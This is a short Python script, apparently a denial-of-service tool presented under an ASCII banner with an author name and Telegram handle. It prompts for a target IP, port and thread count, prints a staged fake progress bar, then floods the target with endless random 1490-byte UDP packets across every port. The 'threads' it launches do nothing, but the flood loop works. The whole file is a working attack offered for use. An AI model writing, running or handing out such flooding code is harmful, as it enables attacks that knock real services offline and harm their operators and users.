import sys
import os
import time
import socket
import random
import threading

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month

#statics
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")

print("  _ \        __ \  __ \               ___|           _)       |   ")
print(" |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __| ")
print(" ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   ")
print("_|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__| ")
print("       ____/                                            _|        ")
print('')
print('Author   : Vladimir Sokha')
print('Telegram : @VSokha')
print('')
ip = input("IP Target : ")
port = int(input("Port      : "))
try:
    threads = int(input("Threads   : "))
except ValueError:
    exit("Threads count is incorrect!")


print("[                    ] 0% ")
time.sleep(2)
print("[=====               ] 25%")
time.sleep(2)
print("[==========          ] 50%")
time.sleep(2)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(1)
sent = 0


for i in range(0, threads):
    thr = threading.Thread()
    thr.start()
    print(str(i + 1) + " thread started!")

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent " + str(sent) + " packet to " + ip + " throught port:" + str(port))
     if port == 65534:
       port = 1